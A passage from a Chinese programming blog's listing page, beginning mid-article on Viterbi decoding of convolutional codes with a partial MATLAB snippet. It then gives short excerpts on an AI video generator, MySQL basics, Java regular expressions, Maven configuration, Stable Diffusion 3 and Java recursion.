🚀2.2算法核心思想
🚀2.3算法优缺点
🚀2.4应用实例
🚀2.5部分源代码和仿真截图
🚀1.BCC卷积码概述 BCC卷积码是一种非分组码，它在1955年被提出。卷积码在编码时是把k个比特的信息段编写成n个比特的码组，但其监督码元不仅与当前编码比特信息有关，还与前面(N-1)个比特有关，其中N为卷积码的编码约束度。卷积码通常记为(n, k, N)。
根据卷积码的特性，它更适合用于前向纠错，并且在许多实际情况下其效果优于分组码。此外，卷积码运算简单，尤其适合用在被高斯白噪声所干扰的传输信道中。
🚀2.维特比译码算法 🚀2.1概述 维特比译码算法是一种卷积码的解码算法，它在1967年被提出。该算法主要基于信道的统计特性以及卷积码的特性来进行解码，因此得到了广泛应用，特别是在卫星通信领域、蜂窝网通信系统和无线局域网（WLAM）中。
🚀2.2算法核心思想 网格图与路径：卷积码的编码过程与网格图中的一条路径对应，即输入序列的编码过程与网格图中的路径一一对应。当输入序列长度为x时，网格中有2^x条不同的路径和编码器的2^x种发送序列对应。
分支度量与幸存路径：在每个符合输入的分支中，都可以计算出分支度量值（通常使用汉明距或欧氏距离等方法）。算法会将到达节点的两条路径进行对比，并选择度量值小的一条作为幸存路径。
累积与回溯：随着数据的接收，算法会累积每条幸存路径的度量值。在译码结束时，从所有幸存路径中选择一条度量值最小的路径进行回溯，从而得出译码输出。
🚀2.3算法优缺点 优点：维特比译码算法解码方法简单，复杂度低。
缺点：随着约束长度N的增加，算法的复杂度呈2^N增长。因此，当N很大时，维特比算法的复杂度会非常高，不适合用于解码。通常，维特比译码算法适用于约束长度小于10的场合。
🚀2.4应用实例 以(2,1,7)卷积码为例，当编码器约束长度为7时，编码器有7个延迟器的状态（0,1），这些状态组成了编码器的64个状态。在解码过程中，算法需要对每个时刻接收到的数据进行64次比较，从64条幸存路径中选择出度量值最小的一条进行回溯，得出译码输出。
举个简单的例子，如图所示（2，1，7）卷积码，生成多项式为（133，171），发送序列为11，得到编码输出为1110。接收端接收到1110后，开始估算发送的信息序列。由于移位寄存器初始状态时，其值为全0，这是已知的。故假设发送的信息序列的第一位为0，则编码输出的结果为00，则对比接收到的第一个输出11，他们的汉明距离为2，此时由汉明距离可估算出第一位发送的信息比特为1，但是这样就没有利用上后面的编码数据，有较高的概率出错。所以，根据第一位发送信息比特为0和1这两种情况，继续算下一位信息比特输入时的编码输出，并且比较它们的汉明距离。容易得出共有4种可能的发送信息序列：00、01、10、11，对应的汉明距离为3、3、2、0。很明显最小的汉明距离为0，对应的发送信息序列为11，与正确的序列一致。以上可以理解为是维特比算法的硬解码过程，接收端得到的数据都是0和1，汉明距离也都为整数。
🚀2.5部分源代码和仿真截图 部分源代码如下
% 清除所有 clc;clear all;close all; EbN0_dB = 0:0.2:1; %设置仿真信噪比 FRAMES_NUM = 50;%每种信干比情况下，进行FRAMES_NUM次试验 RATE=1/2; data_times = 1; message = randi([0 1],1,100);随机产生比特数据 encodeData = convenc(message,trel);%编码 decoded1 = vitbiDecoder_minMetric(receiveSignal,trel,tblen);%译码 %画图 BER = bitError/FRAMES_NUM/70/data_times; BER2 = bitError2/FRAMES_NUM/70/data_times; plot(EbN0_dB,BER); title('译码误比特率随信噪比的变化'); xlabel('信噪比'); ylabel('误比特率'); 仿真图如下
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddce8afc7739e2eaa8b7e75872004efe/" rel="bookmark">
			Luma Dream Machine AI视频生成模型：根据文本和图像快速制作高质量、逼真的视频
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Luma Labs 今天发布了一个新的视频，该视频由名为 Dream Machine 的 AI 模型创建。每个人都可以免费尝试，看看他们可以使用文字和图像制作出什么样的酷炫视频。如果你脑海中浮现出一段视频，但没有视频编辑技能（以及时间和金钱），那么这个人工智能工具可以帮助你将想法变为现实。
Dream Machine 允许用户输入描述性提示，例如“日落时分，一只柯基犬在海滩上追球”，并在大约两分钟内生成与该场景匹配的逼真的五秒视频剪辑。早期的测试人员称赞该系统能够忠实地渲染指定的对象、角色、动作和环境，同时保持流畅的动作和连贯的故事讲述。
视频请到喜好儿网观看~
它是一种高度可扩展且高效的 Transformer 模型，直接在视频上进行训练，使其能够生成物理上准确、一致且丰富的镜头。 Dream Machine 是我们构建通用想象力引擎的第一步，现在每个人都可以使用它！
以思维的速度迭代：ream Machine 是一款速度极快的视频生成器！ 120 秒内有 120 帧。迭代速度更快，探索更多想法，梦想更大！
创建动感十足的镜头：Dream Machine 生成具有逼真流畅的动作、电影摄影和戏剧效果的 5 秒镜头。使死气沉沉变为热闹。将快照变成故事。
角色一致的梦幻世界：Dream Machine 了解人、动物和物体如何与物理世界互动。这使你可以创建具有出色的角色一致性和准确的物理特性的视频。
通过令人惊叹的镜头移动吸引注意力：Dream Machine 可帮助你尝试与场景的空旷和内容相匹配的一系列流畅、电影和自然的摄像机运动。
Dream Machine 的推出标志着人工智能视频生成民主化的一个重要里程碑。虽然 OpenAI 的 Sora 和快手的 Kling 等竞争对手的系统已经展示了令人印象深刻的功能，但它们仍然只有少数合作伙伴可以使用。相比之下，Luma AI 已在其网站上向任何人提供了免费试用 Dream Machine，并计划为流行的创意软件发布 API 和插件。
这种开放方法可以让 Luma AI 在围绕其平台建立充满活力的创作者和开发者社区方面占据先机。通过降低进入门槛，随着用户探索人工智能生成视频的可能性，Dream Machine 有潜力激发创新和创造力的浪潮。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd9778cddc92c6a224a4294681f47c25/" rel="bookmark">
			【MySQL】MySQL数据库基础|数据库的操作|常用数据类型|表的操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、数据库的操作（针对“数据集合”的操作）
1.显示当前的数据库
2.创建数据库
3.使用数据库
4.删除数据库
二、常用数据类型
1.数值类型
2.字符串类型
3.日期类型
三、表的操作
1.列出当前数据库的表
2.创建表
3.查看表结构
4.删除表
💡推荐
前些天发现了一个巨牛的人工智能学习网站，通俗易懂，风趣幽默，忍不住分享一下给大家。【点击跳转到网站】
MySQL组织形式：数据库-&gt;数据表-&gt;行-&gt;列（此处的数据库表示一个抽象的概念，含义就是一个”“数据集合“）
谈到"数据库”这个词要明确,指的是"学科",还是一类"软件",还是某个数据库软件的"服务器程序"，还是一个"数据集合”，要结合上下文来理解
💡一个MySQL服务器上，可以有多个数据库
每个数据库里，可以有多个数据表
每个数据表里，可以有很多行
每个行中可以有很多列
一、数据库的操作（针对“数据集合”的操作） 1.显示当前的数据库 show databases; 注意：
（1)现有数据库不止一个，所以要加 s （2）最后要带上; 而且必须是英文的分号
（3）输入的单词之间，要带有空格，多个空格是可以的，但是至少有一个
（4）输入完毕后，按 回车 执行这个命令
（5）如果输入命令错误的时候，mysql会给出错误的提示，告诉我们错误出现的位置
（6）SQL是大小写不敏感的，写成大写或者小写都行
2.创建数据库 create database 数据库名 (charset 字符集名); 注意：
（1）创建一个数据库，所以不是复数
（2）这里的数据库名不能和“关键字"（eg：create）重复，最好是带有特定涵义的单词，如果想用关键字作为数据库名，可使用反引号（ ` )把这个名字引起来
（3）在创建数据库的时候，可以指定字符集，charset 字符集名即可；后续创建数据库的时候，建议大家使用utf8（mb4）作为字符集，否则mysql 5.7默认字符集是拉丁文，不支持中文，（mysql 8默认的就是utf8），mysql 的 utf8 其实不是 完全体,比标准的 utf8 少了一些东西 (主要是少了 emoji 表情)，为了解决上述问题，mysql 提供utf8mb4 这样的字符集(mysql 独有, 就是完整的 utf8)
（4）校验规则：可以认为是字符串比较的时候,对应的规则般不需要修改,就使用默认值即可
问：在计算机中一个汉字占几个字节？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd9778cddc92c6a224a4294681f47c25/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/faaf2d1e2cd0d17995104d9a1d96046e/" rel="bookmark">
			深入理解Java正则表达式及其应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正则表达式是一种强大的文本匹配和处理工具，可以在字符串中查找、替换、提取符合特定模式的内容。Java作为一种广泛应用的编程语言，提供了丰富的正则表达式支持。本文将深入探讨Java正则表达式的基本概念、语法以及常见应用场景，帮助读者全面理解和灵活运用Java正则表达式。
一、Java正则表达式基础知识
1.1 正则表达式的定义
正则表达式是一种描述字符模式的方法，由普通字符和特殊字符组成。它可以用来匹配字符串中的某个部分或整个字符串，并进行操作，如查找、替换等。
1.2 Java中的正则表达式类
Java提供了java.util.regex包中的相关类，其中Pattern类代表编译后的正则表达式模式，Matcher类用于对字符串进行匹配操作。通过这些类，我们可以在Java程序中使用正则表达式进行字符串的处理。
二、Java正则表达式语法和常用方法
2.1 正则表达式的基本语法
Java正则表达式使用一些特殊字符和预定义的字符类来描述模式。例如，字符类[abc]表示匹配a、b或c中的任意一个字符，元字符.表示匹配任意字符（除了换行符）等。
2.2 常用的正则表达式方法
在Java中，我们可以使用Pattern类的compile()方法将正则表达式编译为一个Pattern对象，并使用Matcher类的方法进行匹配操作，如matches()、find()、group()等。这些方法可以根据正则表达式的模式进行字符串的匹配和处理。
三、Java正则表达式的应用场景
3.1 字符串匹配和验证
Java正则表达式可用于验证用户输入的合法性，如邮箱、手机号码等。通过编写适当的正则表达式模式，可以判断给定的字符串是否符合特定的格式要求。
3.2 字符串替换和提取
通过正则表达式，我们可以在字符串中查找特定的模式并进行替换，或从字符串中提取出需要的信息。例如，可以用正则表达式将字符串中的所有数字替换为空格，或提取出字符串中的URL链接等。
3.3 日志分析和数据抽取
在日志分析和数据抽取方面，正则表达式也发挥着重要作用。通过匹配日志文件中的特定模式，我们可以统计日志中的错误信息、访问次数等，或从网页中抽取出需要的数据。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aefb61b36c8eb31da85b1ebcf1ce32e8/" rel="bookmark">
			settings和toolchains.xml 区别用法配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 IntelliJ IDEA 中配置 Maven 项目时，settings.xml 和 toolchains.xml 的使用场景有所不同。以下是具体的使用情景和配置方法：
1. 使用 settings.xml 使用场景 全局或用户级别的配置：包括设置本地仓库位置、远程仓库、代理服务器、认证信息等。需要配置镜像：加速 Maven 依赖下载，例如使用国内的镜像源。配置代理：如果你的网络环境需要通过代理访问外部资源。全局插件配置：为所有项目配置某些插件的行为。认证信息：配置私有仓库的用户名和密码。 配置方法 文件路径：通常位于用户的 Maven 配置目录中，如 ~/.m2/settings.xml，或者 IDEA Maven 配置中的 settings.xml 路径。 IDEA 指定 settings.xml 路径：打开 IntelliJ IDEA。进入 File -&gt; Settings（在 macOS 上是 IntelliJ IDEA -&gt; Preferences）。找到 Build, Execution, Deployment -&gt; Build Tools -&gt; Maven。在 Maven settings 中指定 User settings file（用户配置文件）路径，如果需要，还6. 可以指定 Global settings file（全局配置文件）路径。 2. 使用 toolchains.xml 使用场景 多 JDK 配置：当项目需要特定版本的 JDK 或其他工具时（如编译器），通过 toolchains.xml 可以精确指定构建过程中使用的工具版本。项目需要在不同环境中使用不同工具链：例如在开发、测试、生产环境中使用不同版本的 JDK。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aefb61b36c8eb31da85b1ebcf1ce32e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04c984efea89fab7a4bfdc8659092ff2/" rel="bookmark">
			[AI Stability] 开源AI新利器：Stable Diffusion 3 Medium震撼发布！文本到图像再升级！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Stable Diffusion 3 Medium(SD3) 开源了，我们来看下。
关键要点 Stable Diffusion 3 Medium 是 Stability AI 迄今为止最先进的文本到图像开源模型。该模型的体积小巧，非常适合在消费级 PC 和笔记本电脑上运行，也适合在企业级 GPU 上运行。它的尺寸适中，有望成为文本到图像模型的下一代标准。现在，该模型的权重在开放的非商业许可下可用，并提供低成本的创作者许可。对于大规模商业用途，请联系我们获取许可详情。要尝试 Stable Diffusion 3 模型，可以通过 Stability 平台的 API 进行体验，在 Stable Assistant 上注册免费的三天试用，或者通过 Discord 尝试 Stable Artisan。 例子 自己动手跑一下，看看效果
prompt: happy-childrens-day
提示词非常短，效果一般
prompt: a-ragged-man-wearing-a-tattered-jacket-in-the-nineteenth-century
对比之前omost的效果，同样的提示词，确实omost好
prompt: Two frustrated programmers having a heated argument in a modern office. One, a young male with glasses and a T-shirt with programming slogans, is angrily gesturing. The other, a young female with short hair and a laptop covered in tech stickers, is passionately defending her point.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/04c984efea89fab7a4bfdc8659092ff2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/698397f6b49a0ecf3902595cebe1c10b/" rel="bookmark">
			Java——递归
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、递归介绍 1、什么是递归 递归在Java编程中是指一个方法调用自身的编程技巧。
public static void foo() { //... foo();//方法调用自身 //... } 2、递归用于什么场景 递归是一种常见的算法设计方法，特别适用于解决那些可以分解为相似子问题的问题。常见的递归问题包括阶乘计算、斐波那契数列、树和图的遍历等。
3、递归包含部分 一个递归方法通常由两部分组成：
基准情况（Base Case）：递归过程中终止递归的条件。如果没有基准情况，递归将进入无限循环。递归步骤（Recursive Step）：将问题分解为一个或多个子问题，并调用自身处理这些子问题。 4、递归的优点和缺点 优点：
代码简洁：递归可以使代码更简洁和易读，特别是对于那些自然递归的问题（如树遍历）。自然性：某些问题（如组合数学中的问题）自然适合递归解决。 缺点：
性能问题：递归可能导致较大的栈消耗，特别是在递归深度较深时，可能引发栈溢出错误（StackOverflowError）。复杂性：对于某些问题，递归可能导致重复计算，效率较低；需要进行优化（如使用记忆化或动态规划）。 二、递归详细解释 1、递归详细解释 下面我们用以下例子来介绍递归：
public class Test { public static void test(int n) { if(n &gt; 0) { test(n - 1); } System.out.println(n); } public static void main(String[] args) { test(2); } } 首先是主函数调用 test 方法，传入的参数是 2。这时就会开辟一个 test 函数栈帧，这里的参数 n 值为 2。
然后这里的 test 函数开始依次执行它的方法体的语句，首先就是判断 n &gt; 0，如果 n &gt; 0 为真就调用 test(2 - 1)，可以发现这里 n &gt; 0 为真，所以接着调用 test(2 - 1)，即调用 test(1)， 然后就是开辟下一个 test 函数的栈帧，这里的参数为 1。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/698397f6b49a0ecf3902595cebe1c10b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4193381c1c6f7ffe6f36aaf0010459db/" rel="bookmark">
			源码解析 若依 ，xxljob视频教程，一行一行代码源码解析课程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/271/">«</a>
	<span class="pagination__item pagination__item--current">272/621</span>
	<a class="pagination__item pagination__item--next btn" href="/page/273/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>